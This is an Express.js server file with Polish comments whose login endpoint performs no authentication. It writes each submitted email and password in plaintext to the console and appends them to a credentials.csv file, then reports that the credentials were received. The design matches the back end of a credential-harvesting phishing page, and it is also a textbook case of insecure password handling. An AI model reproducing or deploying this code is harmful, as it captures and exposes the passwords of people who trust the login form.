const express = require("express");
const path = require("path");
const dotenv = require("dotenv");
const apiRoutes = require("./src/routes/api");
const fs = require("fs");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Widoki (zostawiamy na przyszłość, choć nie będziemy z nich korzystać)
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

// Routes
app.get("/", (req, res) => {
  // Sprawdzanie, czy jesteśmy na Glitch (Glitch ustawi zmienną środowiskową PROJECT_DOMAIN)
  if (process.env.PROJECT_DOMAIN) {
    res.redirect("/index.html"); // Przekierowanie bezpośrednio do index.html
  } else {
    res.send("Strona główna - <a href='/index.html'>Przejdź do logowania</a>");
  }
});

// Przekierowanie /login na /index.html
app.get("/login", (req, res) => {
  res.redirect("/index.html");
});

// API Routes
app.use("/api", apiRoutes);

// Endpoint do obsługi logowania
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const dataToSave = `${timestamp}, ${email}, ${password}\n`;

  console.log(`Próba logowania: ${email}, ${password}`);

  // Ścieżka do pliku zapisu
  const filePath = path.join(__dirname, "credentials.csv");

  // Zapisz dane do pliku
  fs.appendFile(filePath, dataToSave, (err) => {
    if (err) {
      console.error("Błąd podczas zapisywania danych:", err);
      return res
        .status(500)
        .json({ success: false, message: "Wystąpił błąd serwera" });
    }

    console.log(`Zapisano dane logowania do pliku: ${filePath}`);
    res.json({ success: true, message: "Dane logowania otrzymane" });
  });
});

// Obsługa błędów 404
app.use((req, res, next) => {
  res.status(404).send("Strona nie została znaleziona");
});

// Obsługa błędów serwera
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Coś poszło nie tak!");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Serwer działa na http://localhost:${PORT}`);
});

